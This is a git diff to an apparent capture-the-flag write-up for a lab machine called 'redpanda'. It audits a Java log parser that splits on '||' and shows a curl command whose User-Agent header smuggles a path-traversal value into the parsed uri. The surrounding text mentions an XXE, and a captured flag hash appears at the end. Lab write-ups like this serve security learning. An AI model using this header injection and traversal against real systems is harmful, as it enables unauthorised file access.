@@ -878,10 +878,39 @@ so we really need to point at `../home/woodenk/foo`, which `/credits/../home/woo
 
 and if we stage the XXE, we don't need to worry about perms problems. [foo_creds.xml](foo_creds.xml)
 
+### code auditing ftw
+
+```java
+    public static Map parseLog(String line) {
+        String[] strings = line.split("\\|\\|");
+        Map map = new HashMap();
+        map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
+        map.put("ip", strings[1]);
+        map.put("user_agent", strings[2]);
+        map.put("uri", strings[3]);
+        return map;
+    }
+```
+
+shows that there is an injection point here:
+  * a blind split on `||`
+  * uri becomes strings[3]
+  * but if user-agent is stuffed with `||` we can sidestep the path parsing on the input
+
+
+and that's super helpful, since while we have sources for `LogParser` class, we don't have them for `panda_search`
+
+
+this.. should work:
+
+```
+$ curl http://redpanda.htb:8080/it/doesnt/matter -H "User-Agent: curl/7.x.x||../../../../../../home/woodenk/foo.jpg"
+```
 
 ## flag
 
 ```
 user:324c9fbcbc65d4032c4bda715a4955dc
 root:
+
 ```
